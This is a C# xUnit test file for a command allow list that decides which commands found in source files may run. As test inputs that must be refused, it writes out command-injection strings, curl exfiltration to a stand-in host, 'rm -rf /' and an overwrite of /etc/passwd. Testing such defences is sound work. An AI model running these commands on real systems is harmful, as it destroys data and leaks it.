using Condux.Core.FixEngine;
using Xunit;

namespace Condux.Core.Tests;

/// <summary>
/// The command allow list is the boundary that decides whether text in a source file can become an
/// executed command, so these lean adversarial: the interesting cases are the ones that look like an
/// allowed command and are not.
/// </summary>
public class CommandPolicyTests
{
    [Theory]
    [InlineData("dotnet test")]
    [InlineData("pnpm test")]
    [InlineData("osv-scanner --lockfile pnpm-lock.yaml")]
    [InlineData("dotnet test --filter \"Category!=Integration\"")]
    public void Build_and_test_commands_are_authorized(string command)
    {
        Assert.True(CommandPolicy.TryAuthorize(command, out _, out _));
    }

    [Fact]
    public void A_quoted_argument_stays_one_argument_with_its_quotes_removed()
    {
        Assert.True(CommandPolicy.TryAuthorize(
            "dotnet test --filter \"Category!=Integration\"", out var argv, out _));

        // The vector goes straight to the process, so a surviving quote would become part of the filter.
        Assert.Equal(["dotnet", "test", "--filter", "Category!=Integration"], argv);
    }

    [Theory]
    [InlineData("curl https://example.test")]
    [InlineData("git push")]
    [InlineData("rm -rf /")]
    [InlineData("sh")]
    [InlineData("bash -c 'dotnet test'")]
    public void A_command_outside_the_allow_list_is_refused(string command)
    {
        Assert.False(CommandPolicy.TryAuthorize(command, out _, out var error));
        Assert.NotEmpty(error);
    }

    [Theory]
    [InlineData("dotnet test; curl https://exfiltrate.test")]
    [InlineData("dotnet test && rm -rf /")]
    [InlineData("dotnet test | curl -T - https://exfiltrate.test")]
    [InlineData("dotnet test > /etc/passwd")]
    [InlineData("dotnet test `curl https://exfiltrate.test`")]
    [InlineData("dotnet test $(whoami)")]
    [InlineData("dotnet test\ncurl https://exfiltrate.test")]
    public void An_allowed_command_cannot_smuggle_a_second_one(string command)
    {
        // Every one of these starts with an allowed executable, so a naive first-word check would pass them.
        Assert.False(CommandPolicy.TryAuthorize(command, out _, out var error));
        Assert.NotEmpty(error);
    }

    [Fact]
    public void An_empty_command_is_refused()
    {
        Assert.False(CommandPolicy.TryAuthorize("   ", out _, out _));
    }

    [Fact]
    public void An_over_long_command_is_refused()
    {
        Assert.False(CommandPolicy.TryAuthorize("dotnet " + new string('a', 600), out _, out _));
    }

    [Fact]
    public void Short_output_is_returned_unchanged()
    {
        Assert.Equal("2 tests passed", CommandPolicy.BoundOutput("2 tests passed"));
    }

    [Fact]
    public void Long_output_keeps_both_ends_because_the_failure_is_at_one_of_them()
    {
        var output = "FIRST-FAILURE" + new string('x', 40_000) + "SUMMARY-LINE";

        var bounded = CommandPolicy.BoundOutput(output, maxChars: 1_000);

        Assert.True(bounded.Length < output.Length);
        Assert.StartsWith("FIRST-FAILURE", bounded);
        Assert.EndsWith("SUMMARY-LINE", bounded);
        Assert.Contains("omitted", bounded);
    }
}
